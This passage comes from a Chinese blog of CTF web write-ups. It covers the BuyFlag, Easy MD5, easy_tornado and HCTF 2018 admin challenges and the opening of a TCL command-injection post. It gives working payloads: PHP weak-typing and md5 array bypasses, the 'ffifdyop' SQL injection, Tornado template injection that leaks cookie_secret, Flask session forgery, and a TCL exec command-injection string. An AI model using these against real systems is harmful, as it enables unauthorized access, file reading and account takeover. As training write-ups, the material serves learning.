<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?%<span class="number">20</span>num=<span class="number">1</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure></div>

<p><code>file_get_contents()</code> 读取指定文件的内容，拼接chr字符得到字符串 <code>&quot;/f1agg&quot;</code> 从而获取flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1string(43) &quot;flag&#123;d715621b-fd8a-480d-8127-c95614ff05c3&#125; &quot;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>F12发现PHP源码片段：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	~~~post money and password~~~</span></span><br><span class="line"><span class="comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">	$password = $_POST[&#x27;password&#x27;];</span></span><br><span class="line"><span class="comment">	if (is_numeric($password)) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;elseif ($password == 404) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>%00404</code> 可以绕过 <code>is_numeric()</code> 但 <code>$password==404</code> 不成立</p>
<p><code>404%20</code> 与 <code>404%00</code> 既可以绕过数字判定又与404弱类型相等。</p>
<p>Cookie中 <code>user=1</code> 表示是Cuiter。</p>
<p><code>money=100000000</code> 会提示传入长度过长，使用 <code>1e16</code> 即可通过money检测。</p>
<p>最终payload的HTTP包：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>26</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">password</span>=<span class="number">404</span>%<span class="number">00</span>&amp;money=<span class="number">1</span>e10</span></span><br></pre></td></tr></table></figure></div>

<p> 得到flag：<code>flag&#123;f811808d-0044-423a-a7f8-363edd027b54&#125;</code></p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>参考：<a class="link"   href="https://blog.csdn.net/weixin_50597969/article/details/115492810" >Easy MD5-wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>共有三关，第一关提示在HTTP响应头中：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Hint</span><span class="punctuation">: </span>select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure></div>

<p>要实现还是SQL注入，但要求是字符串经过 <code>md5()</code> 转化后达到注入的效果，例如 <code>ffifdyop</code> md5加密后变成 <code>&#39;or&#39;...</code> 后面跟上一串无引号的字符串即可实现注入，最重要的是加密后前几个字符依次为单引号、or、单引号，可以编写如下脚本去爆破一个类似的：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>[] = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// var_dump($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// var_dump($b);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$all</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$blank</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">150</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$blank</span>=<span class="variable">$blank</span>.<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">burst</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$blank</span>, <span class="variable">$cnt</span>, <span class="variable">$all</span>;</span><br><span class="line">    <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&lt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r&quot;</span>.<span class="variable">$blank</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r&quot;</span>.<span class="variable">$cnt</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$all</span>.<span class="string">&quot;--md5(&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;) = &quot;</span>.<span class="variable">$tmp</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>)&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$tmp</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;&#x27;&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;md5(&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;) = &quot;</span>.<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">65</span>; <span class="variable">$i</span>&lt;<span class="number">123</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">burst</span>(<span class="variable">$num</span>-<span class="number">1</span>, <span class="variable">$str</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">8</span>; <span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$all</span> = <span class="title function_ invoke__">pow</span>(<span class="number">58</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="title function_ invoke__">burst</span>(<span class="variable">$i</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>php index.php</code> 可以以脚本形式运行php，若是以服务器文件加载php脚本，过长的爆破时间会导致服务器响应超时。实际上该爆破由于爆破时间过长并不可行。</p>
<p>Tips：php可以以脚本形式运行，在配过PHP环境的情况下，直接 <code>php index.php</code> 即可以脚本方式运行php源码。</p>
<p>注入成功后进入第二关，F12看到源码提示：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>用数组即可：<code>?a[]=1&amp;b[]=2</code> </p>
<p>进入第三关：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>虽然变成了严格比较，但是数组依然能绕过（因为md5解析数组都是NULL）：<code>param1[]=1&amp;param2[]=2</code> </p>
<p>最后得到flag：<code>flag&#123;22d586ce-674e-44d8-af08-729a476d4f6a&#125;</code> </p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>参考：<a class="link"   href="https://www.cnblogs.com/xhds/p/12285121.html" >2018护网杯(WEB)easy_tornado(模板注入) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>“&#x2F;flag.txt”提示flag在”&#x2F;fllllllllllllag”中</p>
<p>“&#x2F;welcome.txt”返回”render”提示存在模板注入(?)</p>
<p>“&#x2F;hints.txt”提示filehash的加密方式：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(cookie_secret+<span class="title function_ invoke__">md5</span>(filename))</span><br></pre></td></tr></table></figure></div>

<p>目标是拿到”&#x2F;fllllllllllllag”的filehash，首先需要拿到cookie_secret。</p>
<p>tornado模板下传入：<code>&#123;&#123;handler.settings&#125;&#125;</code> 可以获取环境变量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;2*7&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; ORZ</span><br><span class="line">(这算是注入成了?)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handle/settings&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; &#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;39cedf08-4782-4456-b648-fa29f2c3aba9&#x27;&#125;</span><br></pre></td></tr></table></figure></div>

<p>PHP脚本跑一下可以获得filehash：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;39cedf08-4782-4456-b648-fa29f2c3aba9&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;/fllllllllllllag&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_hash</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;/hints.txt&quot;</span> =&gt; <span class="string">&quot;6718cdb87bbfdf01834d2ff058dfc77a&quot;</span>, </span><br><span class="line">    <span class="string">&quot;/hints.txt-res&quot;</span> =&gt; <span class="string">&quot;85873c38514234be233f9318a17450f5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/flag.txt&quot;</span> =&gt; <span class="string">&quot;40dfb7391c19a66939e6b6f4e9898804&quot;</span>, </span><br><span class="line">    <span class="string">&quot;/flag.txt-res&quot;</span> =&gt; <span class="string">&quot;e27ed0a861b00185d3429dd62561bd1c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/welcome.txt&quot;</span> =&gt; <span class="string">&quot;89aebe7e1c82925a8896b18ed6bd3335&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/welcome.txt-res&quot;</span> =&gt; <span class="string">&quot;617415f68384bc7b96ee0b6b0df42809&quot;</span></span><br><span class="line">    )</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>filehash：<code>06d280b8d701aaea9f2c8bc5e21605b6</code></p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=06d280b8d701aaea9f2c8bc5e21605b6</span><br><span class="line"></span><br><span class="line">=&gt; /fllllllllllllag</span><br><span class="line">flag&#123;811abc8f-ce7b-4c88-bb5b-4c89a65efac0&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>Login过滤了引号，时间盲注不成功</p>
<p>参考：<a class="link"   href="https://www.anquanke.com/post/id/164086" >一题三解——[HCTF 2018]admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h3 id="思路一：Session伪造"><a href="#思路一：Session伪造" class="headerlink" title="思路一：Session伪造"></a>思路一：Session伪造</h3><p><a class="link"   href="https://github.com/noraj/flask-session-cookie-manager" >Flask-Session加密解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>随意注册一个账号后，在修改密码的页面源码中能看到网站源码的Github仓库。由于我做这题时仓库中的源码已经消失了，因此主要看WP解题（233）</p>
<p>源码中显示只要Session中的”name”键的值为”admin”即可获得管理员权限，因此目标是伪造Session。</p>
<p>Flask对Session进行了签名处理后标记在Cookie后，用来检查Cookie是否被篡改；Session的编码过程在Flask源码中可见，可以编写逆处理脚本还原Json对象，查看Session内容：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></div>

<p>先随意注册一个账号，拿到一串Session：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJw9kM2KwjAUhV9luGsXjrYbwUWH1KJwE5Royd2Io7Ex6XWgVdqJ-O5TZHB9Dt_5ecD-3NjWwezW3O0I9pcTzB7w8Q0zkLr2WK6jYZOSDlHqqlN6PSXhalmSk8XKI2-80cuE9LInsWKls0Tq4xh9mKLIOyW2Cfk8VeLkpHcBdehILNjoTa10PjExSwZfjzrrsMwTLFeDzyTEC8aCamIcy1ilVC4cecmosZdDhhJZbyLVkreJYZzDcwTHtjnvbz_BXt8TiHfB-OOUChNl3Dj0-VBnVyuRp-i_ghKhl8X613jHqsQBaSZYzV-4Cx8q-yadtrvO_ivXAw8CnG17u8MI7q1tXr_B5xief8q8blk.ZGTtEQ.85FS0oT2YTk2KHJbNYzcvA_coIY</span><br></pre></td></tr></table></figure></div>

<p>用脚本解码后得到：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;_fresh&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;_id&#x27;<span class="punctuation">:</span> b&#x27;<span class="number">59</span>c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc&#x27;<span class="punctuation">,</span> &#x27;csrf_token&#x27;<span class="punctuation">:</span> b&#x27;fedb77df374a218f5e81920d8914d2b8f9c1c662&#x27;<span class="punctuation">,</span> &#x27;image&#x27;<span class="punctuation">:</span> b&#x27;uEpz&#x27;<span class="punctuation">,</span> &#x27;name&#x27;<span class="punctuation">:</span> &#x27;festu&#x27;<span class="punctuation">,</span> &#x27;user_id&#x27;<span class="punctuation">:</span> &#x27;<span class="number">10</span>&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>修改name再加密回去，由于要正确的签名，需要”secret_key”，在源码中可以找到 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，再利用脚本进行加密：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py encode <span class="literal">-s</span> ckj123 <span class="literal">-t</span> <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;59c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc&#x27;, &#x27;csrf_token&#x27;: b&#x27;fedb77df374a218f5e81920d8914d2b8f9c1c662&#x27;, &#x27;image&#x27;: b&#x27;uEpz&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">=&gt;.eJw9kM2KwjAUhV9luGsXjqYbwUWH1KJwE5Royd2IY2tj0utAVdqJ<span class="literal">-O5TZHB9Dt_5ecD-1FZXB7Nbe69GsD-XMHvAxzfMQJnGY7GOlm1CJkRl6k6b9ZSka1RBTuUrj7zx1iwFmWVPcsXapEKZ4xh9mKLMOi23gnyWaFk65V1AEzqSC7Zm02iTTWxMxeDr0aQdFpnAYjX4rCBeMObUEONYxTqhYuHIK0aDvRoytEx7G6lRvBWWcQ7PERyv7Wl_-wnV5T2BeBesP04pt1HFjUOfDXV2jZZZgv4raBl6la9_rXesCxyQdoL1_IU786Gu3qRyu-uqf-Vy4EGAQ8nnC4zgfq3a12_wOYbnH8hybjs</span>.ZGT15A.<span class="number">3</span>MkVXDRdC8_LSSMPuX9Kw5Q5vwU</span><br></pre></td></tr></table></figure></div>

<p>将其复制进Session中即可得到Flag：<code>flag&#123;b865b8d4-cb96-4f76-b368-cb72b79f30ec&#125;</code></p>
<p>装脚本的时候遇到了一些有趣的问题，由于文件夹一开始命名为”[HCTF 2018]admin” 含有空格和 <code>[]</code> 符号，Powershell读取不出，因此右键打开终端时，终端路径自动跳转到了Powershell可执行文件的位置。删除空格和 <code>[]</code> 后恢复正常。</p>
<p>GitHub下载下源码后，需要更改”setup.py”的内容才能安装：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, dirname</span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages	<span class="comment"># Mark1</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read = <span class="keyword">lambda</span> filepath: codecs.<span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;publish&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">    os.system(<span class="string">&#x27;python -m twine upload dist/*&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;package&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">    os.system(<span class="string">&#x27;python setup.py bdist bdist_egg&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&quot;flask-session-cookie-manager&quot;</span>,</span><br><span class="line">    packages=find_packages(include=[<span class="string">&#x27;flask-session-cookie-manager2&#x27;</span>, <span class="string">&#x27;flask-session-cookie-manager3&#x27;</span>]),		<span class="comment"># Mark2</span></span><br><span class="line">    version=<span class="string">&#x27;1.2.1.1&#x27;</span>,</span><br><span class="line">    description=<span class="string">&quot;simple Python script to deal with Flask session cookie&quot;</span>,</span><br><span class="line">    long_description=read(join(dirname(__file__), <span class="string">&#x27;README.md&#x27;</span>)),</span><br><span class="line">    long_description_content_type=<span class="string">&#x27;text/markdown&#x27;</span>,</span><br><span class="line">    keywords=<span class="string">&#x27;Flask session cookie&#x27;</span>,</span><br><span class="line">    author=<span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span>,</span><br><span class="line">    maintainer=<span class="string">&#x27;Alexandre ZANNI, TAbdiukov&#x27;</span>,</span><br><span class="line">    license=<span class="string">&#x27;MIT&#x27;</span>,</span><br><span class="line">    url=<span class="string">&#x27;https://github.com/noraj/flask-session-cookie-manager&#x27;</span>,</span><br><span class="line">    include_package_data=<span class="literal">True</span>,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&#x27;Operating System :: OS Independent&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python :: 2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python :: 3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;License :: Other/Proprietary License&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Topic :: Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Topic :: Utilities&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Environment :: Console&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Intended Audience :: Other Audience&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    install_requires=[<span class="string">&#x27;itsdangerous&#x27;</span>, <span class="string">&#x27;Flask&#x27;</span>],</span><br><span class="line">    <span class="comment"># https://python-packaging.readthedocs.io/en/latest/command-line-scripts.html</span></span><br><span class="line">    scripts=[<span class="string">&#x27;flask_session_cookie_manager2.py&#x27;</span>, <span class="string">&#x27;flask_session_cookie_manager3.py&#x27;</span>],</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Mark处是更改的地方，由于安装依赖的顶层包有两个版本2和3，因此setup在读取时不知道读取哪个，就会产生报错：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">error: Multiple top<span class="literal">-level</span> packages discovered <span class="keyword">in</span> a flat<span class="literal">-layout</span>:...</span><br></pre></td></tr></table></figure></div>

<p>该脚本的安装需要同时用到两个依赖，因此需要手动指定用到的包，即Mark2处的内容。</p>
<h3 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h3>]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>TCL命令注入_西湖论剑2024-ezinject</title>
    <url>/2024/03/11/Security/CTF/TCL%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912024-ezinject/</url>
    <content><![CDATA[<h3 id="exec-与-system"><a href="#exec-与-system" class="headerlink" title="exec 与 system"></a>exec 与 system</h3><p>Tcl 执行 linux 命令可用的函数有 <code>exec</code> 和 <code>system</code></p>
<p>exec 要求传入参数独立且用分隔符严格分开，每个参数只能是可执行文件名、子参数或重定向符中的一个，不接受连在一起的多个参数符号，因此：</p>
<p>[exec echo test -d ‘<code>mktemp</code>‘|bash]</p>
<p>上述语句将执行失败，因为 exec 会把 <code>&#39;</code>mktemp<code>|bash&#39;</code> 一整个当成字符串参数处理，管道符与bash将失去原有含义。同时 exec 不支持一般 shell 的字符扩展处理，例如内联、转义和引号，引号将会被原样传入，因此真正想用 exec 执行上述语句需要写成：</p>
<p>[exec echo test -d <code>mktemp</code>|bash]</p>
<p>tclx 支持扩展的 unix 交互接口，用 <code>[system cmd...]</code> 将会使用系统默认 shell 解释执行后续传入的内容，完全遵循这些 shell 的特点与规则。</p>
<p>简单来说，exec 为要执行的目标命令（通常为可执行文件）创建专用子进程并执行，通过一定语法规则解析后续参数，包括将字符串参数传给目标命令，执行可执行文件，管道重定向操作等。而 system 将后面的所有命令内容直接丢给系统默认 shell 自行解析处理。</p>
<p>参考：<a class="link"   href="https://wiki.tcl-lang.org/" >Tcl-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<p>system 命令来自 tcl 的扩展库 tclx，tcl 本身是不自带 tclx 的内容的，但 expect （较新的版本）封装了该扩展库。</p>
<h3 id="西湖论剑-web-ezinject"><a href="#西湖论剑-web-ezinject" class="headerlink" title="西湖论剑-web-ezinject"></a>西湖论剑-web-ezinject</h3><p>只讲 tcl 注入部分，java 将如下代码交给 shell 执行：</p>
